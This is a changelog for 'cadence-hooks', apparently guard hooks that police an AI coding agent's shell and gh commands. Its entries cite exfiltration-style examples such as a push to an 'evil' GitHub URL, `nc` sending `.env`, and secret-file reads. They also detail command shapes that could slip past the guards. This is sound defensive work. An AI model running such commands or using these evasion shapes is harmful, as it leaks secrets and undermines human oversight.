# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).

## [Unreleased]

### Fixed

- **`guard-gh-write` allows `gh issue create --web` on any repo.** With `--web` (or `-w`) gh opens the new-issue form in the browser and creates nothing, so the person reviews and submits it there; the guard blocked it as a write to an unowned repo, which left only a hand-built URL for filing on public trackers. A `-w` or `--web` given as another flag's value (`--title -w`) does not count, any word gh's `issue create` does not know (`--web=false`, a stray argument) keeps the old verdict, and so does a `GH_BROWSER=`/`BROWSER=` set anywhere in the command, since gh runs that command with the URL. `gh pr create --web` keeps its verdict, since gh can push the head branch before opening the form (cameronsjo/cadence-hooks#1351).
- **`guard-body-budget` ignores a marked provenance block.** A PR, issue, review or comment body that ends with a `<!-- claude-trailer -->` line followed by the producer tuple (`Session-Id`, `Model`, `Harness`, `Machine`, `Co-Authored-By`, the Generated-with line, or any other short `Key: value` line) no longer counts those lines toward the word budget or the narration check. Only the last marker counts, and the block must be at most 12 non-blank lines of at most 100 characters and 30 words in all, every line trailer-shaped. Prose, a long line, or a thirteenth line after the marker voids the cut and the whole body is measured as before. Bodies without the marker keep the old key-based stripping. Probed `redact-external-content`, `warn-overshare`, `warn-pr-issue-link`, `warn-inline-body` and `verify-pr-autoclose` with the tuple: none misfired, so they are unchanged.

## [0.124.0] - 2026-10-06

### Added

- **`warn-unreviewed-ready-flip` nudges at `gh pr review` when the marker's values sit off line 1 (#1335).** A review body carrying `head=<40-char SHA>`, `crit=` and `imp=` whose first line is not a well-formed `<!-- cadence-review: … -->` marker used to look reviewed to a person and surface only at `gh pr ready`. The nudge now fires on the review itself and gives the literal line to paste, prefilled with the body's own head SHA and counts (`<reviewer>` left to fill). It reads an inline `--body`, an on-disk `--body-file`, or a readable same-command heredoc; it never calls `gh`, never blocks, and is silent when line 1 parses or a trigger token is missing. The existing `Bash(*gh pr *)` wiring already reaches `gh pr review`.

### Changed

- **`guard-body-budget` measures a body file the same command writes by heredoc (#1334).** `cadence:redaction`'s gated form writes the body, scans it and posts it in one command, so the file on disk was stale and the guard only nudged "cannot measure". When the only write of the body file is a bare `cat > FILE <<'EOF'` before the post, with a found terminator and text that cannot expand, and no `cd`/`pushd`/`popd` before the post (which could put the writer and the post in different directories), that heredoc text is now measured, and an over-budget one gets the verdict the same text in a separate file gets. Every other same-command write keeps the nudge, which now names the redaction gated form as the known-unmeasurable case and says the write can move to its own command, since the gate sits between the scan and the post.
- **`guard-gh-write` and `prevent-secret-writes` name the unresolved variable when one is what blocks (#1337 item 1).** A loop write whose only blocked target is an expansion (`for …; do gh pr merge 3 -R "$r"; done`) now says `cannot resolve "$r" in -R; use a literal owner/repo` instead of `gh loop targets repo you don't own`, matching the single-command arm. A write target that reads as a secret only because a `$VAR` may complete it (`> .env$X`, `> id_rsa${SUFFIX}`) now says the target `has an unresolved "$X"` instead of claiming a deny-set secret file. Verdicts are unchanged; a literal secret name beside a variable (`> $DIR/.env`) keeps the old message. `prevent-secret-leaks` needed no change: since #1303 it never judges a name containing a variable.

### Fixed

- **`guard-push-remote` judges each push in a chain by its own target.** `git push origin feat && git push --tags` and `git push mine HEAD && git push` blocked as "chained git push without explicit remotes", and `git push origin a && git push mine b` as "chained git push to different remotes", even when every remote was owned. The chain shape no longer blocks: a bare push is judged by the remote git resolves for it (`branch.<b>.pushRemote`, `remote.pushDefault`, `branch.<b>.remote`, then `origin`), a named one by that remote's URL, and an explicit URL directly. Each push in a chain gets the verdict it would get on its own: an unowned remote, URL or tracking remote blocks the chain, and a destination built by the shell (`git push "$REMOTE" b`) nudges, as a single push does. A chain with a bare push that may also switch branch or change tracking keeps the old block, since the bare push then goes to the new branch's remote, which the guard reads only as it is before the command runs. Any `git` call counts unless its subcommand is a known non-switching one: inspection (`status`, `diff`, `log`, `show`, `reflog`, `merge-base`, …), housekeeping (`add`, `commit`, `clean`, `gc`, `apply`, `am`, …), `merge`, `tag`, `remote`, `submodule`, `lfs`, a `fetch` or `pull` without `--set-upstream`, a `stash` other than `stash branch`, a `config` that leaves `branch.*`/`remote.*`/push keys alone, a `rebase` naming one upstream at most (`rebase origin/main`, `rebase -i`, `rebase --continue`), a `branch` without a tracking option or `-f <name> <start>` (`-d`, `-m`, `-vv`), and a `worktree` other than `worktree add`. So `checkout`, `switch`, `rebase <upstream> <branch>`, `branch -u`, `worktree add`, `bisect`, an alias, `gh pr checkout` and a command word built by an expansion all keep the block. Loops and an unparseable command with several pushes keep their blocks (cameronsjo/cadence-hooks#1329).
- **`prevent-secret-push` reads a `git … "$@"` wrapper function through its call sites.** `gg() { git -C "$REPO" "$@"; }; gg diff …; gg log …` was refused as a `git $@` whose subcommand it could not resolve, though no call site pushes. When every positional-parameter git call sits in a function body the command defines, and every mention of that function is its definition or a call whose first word is a literal builtin that publishes nothing, the wrapper is skipped like the builtin it runs. A call site naming `push`, the fetch family, a builtin that runs a command (`rebase`, `bisect`, `submodule`, `filter-branch`, `difftool`, `for-each-repo`), `config`/`remote`/`hook`, a non-builtin, an option or an expansion; a call behind a prefix (`eval gg …`, `time gg …`); a command that also runs text it does not spell out (`eval "$CMD"`, a sourced file, a `trap`); a body that is anything but one plain `git` invocation (literal words, a `-C "$VAR"`, and the positional parameters; no second command, `shift`, `set` or other expansion); a command carrying a `#` comment, an ANSI-C `$'…'` string, a heredoc, a `${…}`, a `$(…)` or a backtick, any of which can move the body's closing brace; and a `git "$@"` outside any function body all keep the old block (cameronsjo/cadence-hooks#1338).
- **`prevent-secret-push` names a push directory that does not exist yet instead of blaming the config.** `git worktree add <p> -b <b> <base> && git -C <p> push -u origin <b>` was refused with "git could not read the config", because `<p>` does not exist when the guard runs. It still blocks, since nothing there can be scanned, but the message now names the missing directory and says to run the push as its own command once it exists. Message only; no verdict changes (cameronsjo/cadence-hooks#1336).
- **`prevent-secret-push` names the variable or substitution behind a directory it cannot resolve.** `cd "$(cat /tmp/dir)" && git push …` and `git -C "$VAR" push …` were refused as "could not resolve which repository or refs this push publishes", and `git -C "$VAR" <alias>` as "may be an alias this guard cannot resolve". When an unreadable `cd`/`pushd`/`-C`/`env -C` target is the cause, the message now names that token (`$(cat /tmp/dir)`, `$VAR`) and asks for a literal path. Message only; no verdict changes. The two other asks of the same issue already hold on `main` and are now pinned by tests: a variable bound to a literal earlier in the line (`W=/abs; git -C "$W" push`) resolves at the dispatch seam (#1287), and `write-tree` and `verify-commit` are builtins that never reach the alias probe (part of cameronsjo/cadence-hooks#1337).
- **`git-safety` reads a script file before saying it cannot see inside it.** Every `bash <script>`, `sh <script>`, `./x.sh` and `source x.sh` drew "git-safety cannot see inside a script file", even a script that runs no git, so the note repeated on every script run. The guard now reads the script, from the directory its segment runs in, when it is a regular file of at most 256 KiB, and adds the note only when the text spells `git` as a word (any case; `.git`, `$GIT` and `$GIT_BIN` count, `github` and `.gitignore` do not). A missing, unreadable, oversized or pseudo-filesystem file, a name built by an expansion, `~` or a glob, a segment whose directory cannot be followed, and a script whose file name the command mentions again (it may be written before it runs: `cat > x.sh <<EOF … EOF; bash x.sh`) keep the note. A script that calls another script or a tool that runs git, without spelling `git` itself, no longer gets the note; it never blocked (cameronsjo/cadence-hooks#1339).
- **`guard-gh-write` no longer tells a looped `gh api` write to add `-R`, which `gh api` does not have.** A `gh api` write whose endpoint names its repository literally (`repos/<owner>/<repo>/…`, plain names only) now counts as an explicit target in a loop, as `-R` does, in both relaxed and `CADENCE_GH_STRICT_LOOPS=1` mode, when the loop is plain: only `for name in <plain words>` headers (a lowercase name starting with a letter, so no `$_`, which the shell resets after every command, no `IFS`, `GH_HOST` or `HOME`, none of zsh's `PATH`-tied `path`-family arrays, no `histchars` or `pipestatus`, whose values zsh rewrites, and none of the lowercase proxy variables `http_proxy`, `https_proxy`, `all_proxy` and `no_proxy`; at least one value, and no value starting with `-` or `=`, or starting or ending with `.`; no `..`), `do`/`done`, and `gh` commands whose subcommand is on a fixed list that cannot change gh's host, login or config and writes no file to a given path (`auth`, `config`, `alias`, `release`, `run`, `repo`, `gist` and extensions are among those left off, and `pr checkout` and `issue develop` are refused, so a `pr` or `issue` command's verb, after an optional `-R`, is plain literal text and no word is `checkout`, `co` or `develop`, which also sends loops such as `--search develop` to the loop policy), joined by `;` and newlines only and whose arguments are plain words or, outside a flag, expand the loop's own variables only as `${name}` or as `$name` followed by the end of the word or one of `/ - , @ + =`. zsh rewrites every other form, for example `$b:s/a/--hostname=x/` becomes the flag `--hostname=x`, so a `:` modifier after an unbraced name, any operator, flag or subscript inside braces, and a word starting with `=` all keep the loop policy. The check reads the words as written, before the guard's own static expansion, which treats a loop variable as unset, refuses `|` and `&`, and refuses any `#` or any character other than printable ASCII, space, tab and newline, because the comment stripper reads some (U+3000, VT, CR) as a word boundary the shell does not. When a loop with a literal `gh api` path is refused for its shape, the block now says the guard cannot follow the loop and describes a plain loop, instead of asking for a literal path. An unknown short flag on `gh api` (`-Z`) now names no endpoint and blocks rather than keeping the earlier verdict; gh rejects such a flag itself. Anything that could move a later iteration's target (an `export`, a function, `source`, `eval`, a `while` condition, another expansion) keeps the cwd-based loop policy, because the per-segment check that then judges ownership, host, and inherited `GH_HOST` reads the body once. So `for b in a b; do gh api -X DELETE "repos/<owned>/<repo>/git/refs/heads/${b}"; done` is allowed and the same loop against an unowned repo is refused as an unowned target. A path whose owner or repo is a variable, a `{owner}`/`{repo}` placeholder, or any other non-literal text keeps the cwd-based loop policy. A loop that mixes such a write with a `-R` write (`gh pr comment $i -R <owned>/<repo>`) still gets the cwd-based loop policy, as on `main`. Every fix the guard offers for a `gh api` write now names the path (`gh api repos/<owner>/<repo>/…`) instead of `-R`: the loop block (a loop mixing both kinds gets both fixes, and a loop whose `-R` commands and literal-path `gh api` writes all name their targets is told to run the two as separate commands, since it still gets the cwd-based policy, and `-R` advice in a loop that also holds a literal-path `gh api` write excludes that write), the unowned, unresolvable, unreadable-target and unexpanded-expansion blocks, and the parse-failure, too-large and too-many-directories blocks. `-R`/`--repo` on `gh api` (which gh rejects with `unknown flag`) is read as a value-taking flag, so `gh api -R o/r repos/o/r` is no longer an "unverifiable write" and a GET carrying it passes, and it never stands in for the endpoint's repository: `gh api -X DELETE repos/<unowned>/x -R <owned>/x` was allowed and now blocks. `gh api`'s endpoint is now found the way gh parses short-flag clusters: in `gh api -X DELETE -ip repos/<owned>/x repos/<unowned>/y`, `-p` takes `repos/<owned>/x` as its value and gh deletes in `<unowned>`, which the guard read as the owned endpoint and allowed; a letter gh api does not have, or a long flag whose name is spelled through an expansion (`--$b`; an expanded value such as `--field=body=$x` is still read as a value), now names no endpoint and blocks (cameronsjo/cadence-hooks#1344).
- **`guard-push-remote` judges a literal `git -C` push loop per iteration (#1341).** `for d in /a /b; do git -C "$d" push origin main; done`, run from a checkout whose remote is not yours, blocked as "Push loop targets remote you don't own", because the loop's remote was resolved in the session's cwd. When the whole command is one `for` loop over literal words, its body runs only `echo`, `true`, `tail`, `head`, `grep` and `git` pushes, with no prefix assignment, no command substitution and no redirect other than `2>&1` or `>/dev/null`, every push is `git -C <dir> push … <remote>` with `<dir>` a literal or exactly the loop variable and `<remote>` a literal, each iteration's remote is now resolved in the directory it runs in, and the loop is allowed when every target is owned and no push carries a config destination. A resolved unowned target now gets the block the same `git -C <dir> push` gets on its own, from any checkout; from an owned checkout main let such a loop through with only a directory nudge (`for d in owned other; do git -C "$d" push origin main; done`). Any other loop (including one whose body runs a non-push `git` call such as `remote set-url`, `remote rename` or `config`, which could retarget the push), a target git cannot resolve with no unowned target beside it, more than four directories or more than eight iteration pushes keeps the old verdict. The `&&` chain from the same report (`git -C <owned> merge … && git -C <owned> push -q origin b` from an unowned checkout) and the unrolled loop already passed after #1329 and #1330; both are now pinned by tests.
- **`redact-secret-output` keeps a bare `pass=<digits>` tally (#1342).** Test summaries print `pass=5 fail=0`, and the bare `pass` key masked the count. A name that is only `pass` (any case) now passes a value of one to six digits when it is written plainly and unquoted (`pass=5`, `pass: 5`, `rc=0 pass=5 fail=0`) and the number is the whole value: it ends the line, is closed by `,`, `;` or `)` followed by a space, the line end or another count field (`pass=5,fail=0`), or the next word starts its own `key=` or `key:` field (`pass=5 fail=0`, `pass=5, fail=0`). The value then ends at the number, so a secret in a later field (`pass=5 token=…`) is still masked on its own, and a number followed by any other word (`pass=5 hunter2`, `pass=4821<TAB>secretword`) masks as before. A numbered name (`pass1`, `pass_2`) is not the bare tally name and masks any value. A longer number (`pass=48213907`), a quoted or JSON value (`pass="5"`, `{"pass": 42}`), a `--pass` flag and a query string's `&pass=` all still mask, as do `pass=hunter2` and `pass: s3cret`. A numeric PIN of six digits or fewer under a bare `pass` key (`pass=4821`) now passes; that is the accepted cost of reading test tallies. `DB_PASS`, `PASSWORD`, `mypass` and every longer name keep their strength, so `DB_PASS=1234` still masks, and the `lastpass`/`hashpass`/`endpass` stems now also end their value at a leading count under the same whole-value rule (`lastpass=5 hunter2` and `pass=1234,hunter2` still mask). The exact upper-case `PASS` was already exempt as a test-runner status word and is unchanged.
- **`guard-op-vault-scan` sees a vault scan an exec wrapper runs (#1343).** `perl -e 'alarm 60; exec @ARGV' op vault list` (the macOS timeout idiom) and `env op vault list` ran the scan unseen. The guard now reads the command word after the shared runner peel the other guards use (`env` with assignments and flags, `command`, `exec`, `nice`, `time`, `timeout`, `nohup`, `sudo`, `xargs`, `stdbuf`, `setsid`, a leading `VAR=value`) and after `perl -e`/`-E` whose script runs `exec @ARGV`, so `op vault list` and `op item list` block wherever one of them is what runs. Single-item reads stay allowed through the same wrappers (`env op whoami`, `timeout 60 op read op://…`), and a `perl` script that does not exec its arguments (`perl -e 'print @ARGV' op vault list`) keeps the old verdict.

## [0.123.1] - 2026-10-05

### Fixed

- **`redact-secret-output` stops masking five non-secret shapes.** A `token` after `next`, `idempotency`, or `page` preceded by `next`/`prev`, is a pagination or idempotency handle in every spelling (`NextToken`, `nextToken`, `next_page_token`, `nextPageToken`, `prev_page_token`, `IdempotencyToken`), and AWS's PascalCase `ClientToken` is exempt by its exact name; Vault's `client_token`, a bare page token (`PAGE_TOKEN`, `FB_PAGE_TOKEN`, `pageToken`: a Facebook Page access token), `KEY_TOKEN`, `SYNC_TOKEN`, `RESUME_TOKEN` and `CONTINUATION_TOKEN` still mask. A bare `YES`/`NO` after a strong name in the `name: value` form is prose, so MySQL's `Access denied … (using password: YES)` keeps its text. A name that is only a glued `lastpass`, `hashpass` or `endpass` keeps a value of digits only (`lastpass=1696500000`, `HASHPASS: 12`); any other value (`LASTPASS=<secret>`), and any longer name (`LASTPASS_PASSWORD`, `LASTPASS_PIN`), still masks. Matching only narrows; no detection is added, and `SessionToken`, `AccessToken`, `ClientSecret`, `password: <value>` and the existing canaries still mask. The redactor is not wired yet (cameronsjo/cadence#1565). Part of cameronsjo/cadence-hooks#1274; its miss list is outside the threat model.
- **`guard-push-remote` judges a push into another repository against that repository's remote, not the session's.** From a checkout whose origin is unowned, `git -C <owned> push origin main`, `bash -c 'git -C <owned> push origin main'`, `bash -c 'cd <owned> && git push origin main'` and `(cd <owned> && git push)` were blocked with "Push target is not yours", naming the cwd's origin: the push walk judged the push in `<owned>` and found it owned, and the tracking-remote fallback then judged the cwd's origin too. That fallback now runs only for pushes that run in the cwd. A top-level push segment is left out of it when the walk of that segment alone places every push it holds in another readable directory (`git -C <dir> push …`), matched argument list by argument list against the parsed segments; a heredoc a shell reads on stdin (`bash <<'EOF'`) still counts as a push here, as does any segment the two readings disagree about, whose directory is unreadable (`git -C "$D"`), or that names both a positional destination and `--repo`. This turns those blocks into allows; an unowned `-C` or `cd` target from an owned checkout still blocks (cameronsjo/cadence-hooks#1330).
- **Three more flood tests no longer assert wall-clock time.** `guard_push_remote::tests::a_looped_push_flood_probes_each_remote_once` (2 s) and `warn_stacked_base_delete::tests::clone_floods_allow_before_the_deadline` (2 s, Unix only) now count git spawns, which is the work their regressions multiplied (one probe per push): at most 8 and 4, measured 4 and 0. `guard_push_remote::tests::a_cd_flood_before_a_push_is_judged_before_the_deadline` (5 s) now asserts linear scaling through `test_builders::assert_scales_linearly`, since its regression was quadratic. Each keeps a generous hang guard (30 s, or the helper's 120 s). Test-only; no guard behavior changes (cameronsjo/cadence-hooks#1314).

## [0.123.0] - 2026-10-05

### Added

- **`session guard` counts every nudge it fires in `guard_nudges.jsonl`.** Each branch-switch, blanket-staging, or lane-collision nudge appends one row (`check`, `tool`, `sessionId`, `peerCount`, `repo`) to the metrics dir, so whether any of them earns a block tier can be decided from counts. The row is the only side effect: no context is added, and a write failure is a silent no-op (cameronsjo/cadence-hooks#272).
- **`session guard` nudges on a Bash command that writes into a live peer's declared lane.** It reuses `enforce-worktree`'s subprocess tree-mutation walk (#234), so a `sed -i`, `tee`, `>`/`>>`/`2>` redirect, or a package-manager verb whose directory lands in a peer's `touching` path now warns just as an `Edit`/`Write` there does, including through `cd`, `sh -c` and `$(…)`. It only adds nudges, and an allowed command is never blocked. A target the walk cannot resolve is not warned about: a relative `$VAR/…` path, `cp`/`mv`/`install`, `python -c`, and the walk's other documented misses (cameronsjo/cadence-hooks#272).
- **`session plan-driver` asks the operator to confirm a `/model` switch away from the in-flight plan's `Driver:` family.** `HookEvent` gains `PreModelSwitch`. On that event the check finds the session's plan by its frontmatter `approved_session_id`, then by a `branch:` match on the current branch, reads its `## Orchestrator` → `Driver:` family, and answers `permissionDecision: "ask"` when `to_model` names a different family. The reason is built only from fixed text and closed-enum family names, and notes the prompt-cache re-send and, when leaving Opus 5.5 for anything but Fable 5.1 or Mythos 5.1, the lost reasoning. Measured on Claude Code 2.1.285, an `ask` with no human attached refuses the switch outright — an SDK `set_model`, and a `/model` sent through `claude -p` or a stream-json message, which also report `source: "command"` — so the check asks only when `source` is `command` or `picker` and the hook env shows an attended TUI (`CLAUDE_CODE_ENTRYPOINT=cli` and `CLAUDE_CODE_SESSION_ATTENDED=1`), and never when `CLAUDE_CODE_REMOTE` is set. It never blocks, and it is silent when matched plans disagree about the driver, record none, or the model family is unrecognized. The cadence plugin wiring follows in a separate PR (cameronsjo/cadence-hooks#989).
- **`session timer` and an opt-in `session nudge-afk-gap` give a session a sense of wall-clock time.** `cadence-hooks session timer start|lap|stop [LABEL]` is a CLI stopwatch scoped to the session (`--session-id`, then `CLAUDE_SESSION_ID`/`CLAUDE_CODE_SESSION_ID`, else a shared scope); `lap` prints the elapsed time, `stop` prints it and appends `{ts, sessionId, label, elapsedMs}` to `<metrics_dir>/timers.jsonl`, concurrent `stop`s log one row, and a missing timer, an invalid label, or an invalid `--session-id` exits 1 with the reason on stderr. It is a CLI action like `session declare`, so `CADENCE_BYPASS=1` does not silence it. `nudge-afk-gap` is a UserPromptSubmit hook that does nothing at all, no output and no file I/O, unless `CADENCE_AFK_GAP` is truthy. Enabled, it records each prompt's time in a private per-session stamp (`<metrics_dir>/state/<sid>.afk-gap`, `0600` in a `0700` dir) and, when the gap since the session's last activity reaches `CADENCE_AFK_GAP_MINUTES` (default 240), injects one line: `6 hours later… This session sat idle since its last activity; re-check git state, peer sessions, and earlier claims before relying on them.` Last activity is the later of the previous prompt and a private tool-activity stamp that `persist-plan-approval` refreshes at most every 5 minutes, and only while the hook is enabled, so a long autonomous run is not read as idle while a `--resume` after hours still is; a session's first prompt, and a corrupt, oversized, non-regular, or future-dated stamp, are silent. It self-disables in cloud sessions (`CLAUDE_CODE_REMOTE=true`), where the activity stamp cannot refresh. The hooks.json wiring follows in a cadence PR. (cameronsjo/cadence-hooks#480)

### Changed

- **The `doctor --quiet` blocker envelope now informs the operator rather than instructing Claude.** It used to say `Run 'cadence-hooks doctor' and tell the user in one line before other work.` and now says `Running 'cadence-hooks doctor' shows which hooks and why.` The count line is unchanged. This matches the ruling that `<cadence-system-message>` is data with no authority. (cameronsjo/cadence-hooks#1251)
- **`prevent-secret-leaks` judges only a literal secret file name handed to a known reader or sender.** The Bash check was verb-agnostic: every command was suspect unless its verb was metadata-safe, and any operand that might name a secret was judged, so globs, `$VAR`s, URL and API paths, regexes and `VAR=` prefixes kept reading as secret files. It now enumerates the readers and senders (content printers and pagers, `grep`/`rg`/`ag`, `sed`/`awk`, `jq`/`yq`, encoders and dumpers, `source`/`.`, `cp`/`install` to standard output, `dd if=`, `openssl -in`, and the files `curl`, `wget`, `gh`, HTTPie, `scp` and `nc`/`ssh`-style senders send), peels wrappers through core's shared runner peel (`sudo`, `env`, `timeout`, `nice`, `xargs`, …), and judges only a literal deny-list name in a file position, or a glob whose literal text holds a whole deny-list name or extension (`.env*`, `*.key`, `*id_rsa*`). A pattern or filter (`grep -E '…(#|$)'`, `jq '.env'`), an API path (`gh api …/contents/x?ref=$ref`, `tea api /repos/…`), a variable, and a glob that only shares letters with a name (`*hooks*`, `.e*`) are no longer judged. Operands the grammar places in a file slot (after a `grep`/`sed`/`jq` pattern, a pager's or line filter's operands, `openssl -in`) are judged as files, so `grep KEY prod.env`, `less x.key` and `openssl rsa -in x.key` now block; long options match exactly. Unchanged: the Read and Grep tool checks, a secret redirected into a reader, a compound command (`while read l; do …; done < .env`, `{ …; } < .env`), `read`/`mapfile`, or a program that sends its stdin (`nc h 1 < .env`), the `.envrc` loader carve-out, and the env-dump, `printenv` and `/proc/*/environ` nudges; process substitutions (`diff <(cat .env) x`), glued redirections (`cat<.env`), `$(< .env)`, and `bash -o … -c` scripts are now read as well. Accepted misses: an unknown or custom program reading a secret (`python x.py .env`, `git show HEAD:.env`, `kubectl --from-env-file`), a variable or substitution holding a secret path, a shape-only glob (`.e*`, `~/.ssh/*`), names a `find`/`xargs` pipeline supplies, a file a `sed`/`awk` program opens itself, script text fed to a shell on stdin, and a recursive search's `--include`/`--glob` value. The `git`, `kubectl`, `forgectl`, assignment-rebinding, opaque-exec and oversized-command logic is removed. (cameronsjo/cadence-hooks#1303)

### Fixed

- **`enforce-worktree` no longer reads a backslash inside single quotes as an escape after a heredoc.** A command that wrote a file through a heredoc and then ran `sed 's|cd \\"$(mktemp -d)\\" \&\& git commit|x|' f` was blocked from a linked worktree with "`cd //$(mktemp -d` could not be resolved", though it runs no `git commit`. Any escaped quote in a command with a `<<` made the heredoc reading suspect, and the suspect path's quote-blind reading turned the sed script into a `cd … && git commit` chain. The escape check now skips backslashes inside a single-quoted span that opens and closes on one line, which bash reads literally; an escaped quote or `\<` outside single quotes, in `"…"` or `$'…'`, still counts, and a quote left open at a line end keeps the old substring reading (cameronsjo/cadence-hooks#1317).
- **`prevent_secret_push`'s unit tests no longer depend on how fast a loaded runner spawns git.** `help_autocorrect_refuses_an_unknown_subcommand` failed once on `windows-latest`: with no hook deadline armed, each fixture's alias probe was capped at 2 s, and a probe that ran past it on the loaded runner turned an expected allow into the guard's fail-closed block. Under `cfg(test)` the per-probe cap is now 30 s, and an unarmed deadline no longer shortens a spawn, so a probe gets that cap and a scan spawn gets the 20 s cap a disabled deadline gives (it was 3 s); a slow but healthy spawn completes, and no test depends on one timing out. Test-only; the production 2 s probe cap and the hook deadline are unchanged (cameronsjo/cadence-hooks#1319).
- **`guard-gh-write` allows a `gh api` write to an organization on the owner allowlist.** `gh api -X PATCH orgs/<org> -f name=…` was refused as an unverifiable target even when `<org>` was in `CADENCE_ALLOWED_OWNERS`, though the owner is in the path and no `repos/<owner>/<repo>` spelling of an organization setting exists. A relative `orgs/<org>[/…]` endpoint is now judged against the owner allowlist on the host gh reaches (`--hostname`, `GH_HOST`). Only the path before any `?` or `#` is read, the org must be a literal login, and later segments must be plain (no `..`, `.`, percent-escape, `{placeholder}` or `$` expansion); repo-scoped entries (`owner/repo`) do not cover it. A later `repos/<owner>/…` naming another owner (`orgs/<org>/teams/<team>/repos/<owner>/<repo>`), an unlisted org, any other shape, a URL endpoint, and a looped org write keep the unverifiable-write block (cameronsjo/cadence-hooks#1311).
- **`guard-push-remote` no longer blocks a command that only mentions `git push` in text.** A heredoc body, a quoted argument or a commit message holding `git push https://…` (`echo 'git push https://u:t@host/x'`, `cat > notes.md <<'EOF' … EOF`) was blocked as an unowned or unknowable push target, because a literal `git push` substring kept the guard's gate open and the text after it was read as the push's arguments. The gate now opens only for a parsed push, and a push inside a child script (`bash -c '…'`, `$(…)`, an `eval` string) is judged through the repository the push walk read for it, so `bash -c 'git push https://github.com/evil/x.git main'` still blocks. A heredoc a shell reads on stdin (`bash <<'EOF'`, `cat <<EOF | sh`) is read as a script, so a push in its body is judged. The walk's pushes are judged alongside the parsed ones, so a parsed push elsewhere in the command does not hide one (`git push origin main; bash -c 'git push <evil-url> main'` blocks). A push that names no repository, parsed or found by the walk, still has its tracking remote judged beside them, so `git push; bash -c 'git push <owned-url> main'` and `git push <owned-url> main; bash -c 'git push'` block from a checkout whose tracking remote is unowned. Accepted gap: script text piped into a shell from anything other than a heredoc (`echo 'git push …' | bash`, `source <(…)`) is no longer read for a push target; the old text floor caught those (cameronsjo/cadence-hooks#1321).
- **Three flood tests no longer fail on a loaded CI runner.** `trash_guard::tests::a_process_substitution_flood_is_judged_promptly` (an 8 s debug bound, measured 9.6 s and 12.9 s on `ubuntu-latest`) and `prevent_secret_leaks::tests::oversized_substitution_word_is_bounded_and_judged_by_its_tail` (a 3 s bound, measured 3.0 s) asserted wall-clock time, which runner load exceeds with the guard behaving correctly. Each now asserts the property it exists for, linear work, through a new `test_builders::assert_scales_linearly`: the input is judged at one size and at four times that size, and the larger may cost at most 8x (linear is about 4x, quadratic about 16x), taking the fastest of up to five rounds so a load burst does not decide it, with a 120 s hang guard. `shell::tests::case_opener_floods_stay_fast` (a 5 s bound, measured 5.03 s on `windows-latest`) now counts the work instead: the bytes `command_segments` surfaces from the 200 KB flood must stay within 8x the input (about 4x today, 15x before the `case` model it pins), with a 60 s hang guard. Test-only; no guard behavior changes.
- **Two guardrails wall-clock tests get Windows debug headroom.** `warn_stacked_base_delete::a_delete_flood_nudges_without_checking` has failed its 2 s bound on the Windows runner on every main commit since #1278, whose second reading of exec scripts doubled the flood's cost: Linux debug 0.5 s → 0.9 s, release 82 ms → 169 ms, well inside the hook's deadline. `enforce_worktree::union_work_budget_fails_closed_on_adversarial_floods` hit 6.14 s against its 6 s debug bound there (2.03 s on Linux, unchanged by #1278). A debug build on Windows now gets 6 s and 12 s respectively. Linux and release bounds are unchanged.
- **The Windows `Check` job is green again.** `parent_pointer_requires_a_store_transcript_recording_this_plan` (added in #1272) built its relative-path pointer by walking up from the cwd to `/` and appending the transcript's absolute path, which on Windows produced `../../C:\Users\…` — a path that cannot resolve, and on CI never could, since the workspace is on `D:` and the temp dir on `C:`. The test now walks up only when the cwd and the transcript share an anchor, and otherwise plants the same transcript under the cwd and names it relative to that. Production behavior is unchanged: a relative pointer is still refused before the transcript store is touched (cameronsjo/cadence-hooks#1255).
- **`platform-drift` no longer tells you to upgrade a binary that is already ahead.** When the installed `cadence-hooks` is newer than the plugin baseline, the nudge now says the cadence plugin pin is behind and names `claude plugin update cadence@workbench` then `/reload-plugins`. An older binary keeps the `brew upgrade cadence-hooks` text, and the daily gate token (`hooks:<running>><expected>`) is unchanged. (cameronsjo/cadence-hooks#1223)
- **A plan-shape stanza hidden from the rendered plan no longer counts.** The shared line filter behind `lint-plan-shape`, the persist-time format gate and the `## Orchestrator` reader now skips HTML comment blocks (a line-start `<!--` through the line carrying `-->`; a mid-line `<!--` stays literal text), the plan's leading YAML frontmatter (after an optional BOM), and nested fences: a fence closes only on the same character, at least as long as the opener, with no info string, indented at most 3 columns past the opener, so a four-backtick fence holding a three-backtick one, a backtick fence holding a tilde one, or a fence quoting a 4-space-indented nested fence stays one fence. `<!-->` and `<!--->` are complete empty comments. A `Panel:` line in any of those positions now reads as missing and blocks, and a `## Loop` heading there reads as missing. An unterminated fence or comment hides the rest of the plan, so it can only make a stanza read as missing. The checkbox counter reads through the same filter, so a box in a fence, comment or frontmatter is never counted. (cameronsjo/cadence-hooks#1283)
- **`warn-unreviewed-ready-flip` now says it cannot see a review marker posted earlier in the same command.** The hook reads the PR before the Bash command runs, so a command that posts a `cadence-review` marker and then merges drew a bare "not reviewed at head" warning. When no approval signal is found, the message now adds that a marker posted earlier in the same command is not seen and that the warning is stale if the command posts one. The command text is not parsed for markers, and a CHANGES_REQUESTED-only warning does not carry the sentence, since a marker cannot clear that half. (cameronsjo/cadence-hooks#1236)
- **A post to another repo no longer inherits the current checkout's redaction allowlist.** When `redact-external-content` resolves a `gh … -R owner/repo` target that is none of the current checkout's remotes, it drops that checkout's `redaction.allowlist`, `categories` ceilings and `originAudience` from `.claude/cadence.json` and names the destination in its nudge. `additionalPatterns` still apply. The `redact-scan` CLI takes a new `--repo OWNER/REPO` flag that does the same, and prints the same note beside its hits. The destination repo's own config is not looked up: no local checkout of it is assumed, so the scan falls back to the defaults. A post with no `-R`, a `git commit`, a `-R` naming any remote of this checkout, and targets the guard cannot resolve (such as a `gh api` path) keep the checkout's config as before. Shaped hits only nudge, so nothing new blocks. (cameronsjo/cadence-hooks#1245)
